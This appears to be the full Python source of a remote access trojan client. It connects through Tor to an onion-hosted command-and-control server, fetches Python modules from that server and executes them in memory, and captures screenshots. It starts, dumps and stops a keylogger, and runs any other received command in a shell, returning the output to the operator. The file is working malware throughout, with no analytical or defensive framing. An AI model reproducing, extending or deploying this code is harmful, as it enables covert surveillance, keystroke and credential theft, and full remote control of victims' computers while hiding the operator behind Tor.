import json
import os
import socket
import sys
import importlib.util
import requests
from datetime import datetime
from .tor_handler import TorHandler
import base64

ENCODING = 'utf-8'

class MemoryModule:
    @staticmethod
    def load_module_from_code(code, module_name):
        try:
            spec = importlib.util.spec_from_loader(module_name, loader=None)
            module = importlib.util.module_from_spec(spec)
            sys.modules[module_name] = module
            exec(code, module.__dict__)
            return module
        except Exception as e:
            print(f"Failed to load module {module_name}: {e}")
            return None

class Agent:
    def __init__(self, server_url=None, onion=None, port=80):
        self.modules = {}
        self.server_url = server_url
        self.onion = onion
        self.port = port
        self.tor_handler = TorHandler()
        self.session = None
        self.sock = None
        self.setup_connection()

    def setup_connection(self):
        """Setup Tor connection and C2 channel"""
        try:
            # Start Tor
            if not self.tor_handler.start_tor():
                raise Exception("Failed to start Tor")
                
            # Setup Tor SOCKS proxy
            self.session = self.tor_handler.setup_connection()
            
            # Connect to onion service
            if self.onion:
                self.sock = self.tor_handler.create_connection(self.onion, self.port)
            else:
                # Fallback to direct connection (for testing)
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect(('127.0.0.1', self.port))
            
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            self.cleanup()
            sys.exit(1)

    def load_module(self, module_name):
        try:
            if module_name in self.modules:
                return self.modules[module_name]

            # Use Tor session for requests
            response = self.session.get(f"{self.server_url}/tools/{module_name}.py")
            if response.status_code != 200:
                raise Exception(f"Failed to get module {module_name}")

            module = MemoryModule.load_module_from_code(response.text, module_name)
            if module:
                self.modules[module_name] = module
                return module
            
            raise Exception(f"Failed to load module {module_name}")
        except Exception as e:
            print(f"Error loading module {module_name}: {e}")
            return None

    def reliable_send(self, data):
        jsondata = json.dumps(data)
        self.sock.send(jsondata.encode(ENCODING))

    def reliable_recv(self):
        data = ''
        while True:
            try:
                data = data + self.sock.recv(1024).decode(ENCODING).rstrip()
                return json.loads(data)
            except ValueError:
                continue
            except socket.error:
                raise

    def execute_module_function(self, module_name, function_name, *args, **kwargs):
        try:
            module = self.load_module(module_name)
            if module and hasattr(module, function_name):
                return getattr(module, function_name)(*args, **kwargs)
            return None
        except Exception as e:
            print(f"Error executing {function_name} from {module_name}: {e}")
            return None

    def handle_command(self, command):
        if command == 'quit':
            return True

        elif command[:10] == 'screenshot':
            result = self.execute_module_function('screenshot', 'capture')
            self.reliable_send(result if result else '[-] Screenshot failed')

        elif command[:12] == 'keylog_start':
            result = self.execute_module_function('keylogger', 'start_keylogger')
            self.reliable_send('[+] Keylogger Started!' if result else '[-] Keylogger failed to start')

        elif command[:11] == 'keylog_dump':
            logs = self.execute_module_function('keylogger', 'dump_logs')
            self.reliable_send(logs if logs else '[-] No logs available')

        elif command[:11] == 'keylog_stop':
            result = self.execute_module_function('keylogger', 'stop_keylogger')
            self.reliable_send('[+] Keylogger Stopped!' if result else '[-] Failed to stop keylogger')

        else:
            try:
                import subprocess
                execute = subprocess.Popen(
                    command, 
                    shell=True, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                result = execute.stdout.read() + execute.stderr.read()
                self.reliable_send(result.decode())
            except Exception as e:
                self.reliable_send(f"[-] Error executing command: {e}")

        return False

    def cleanup(self):
        """Clean up connections and Tor process"""
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
        if self.tor_handler:
            self.tor_handler.cleanup()

    def run(self):
        try:
            while True:
                try:
                    command = self.reliable_recv()
                    if self.handle_command(command):
                        break
                except Exception as e:
                    print(f"Error in main loop: {e}")
                    break
        finally:
            self.cleanup()

def main():
    # Read onion address from binary if it exists
    onion = None
    port = 80
    try:
        with open("onion.bin", "rb") as f:
            data = f.read()
            decoded = base64.b64decode(data).decode()
            onion, port = decoded.split(":")
            port = int(port)
    except:
        pass

    agent = Agent(onion=onion, port=port)
    try:
        agent.run()
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
    finally:
        agent.cleanup()

if __name__ == '__main__':
    main() 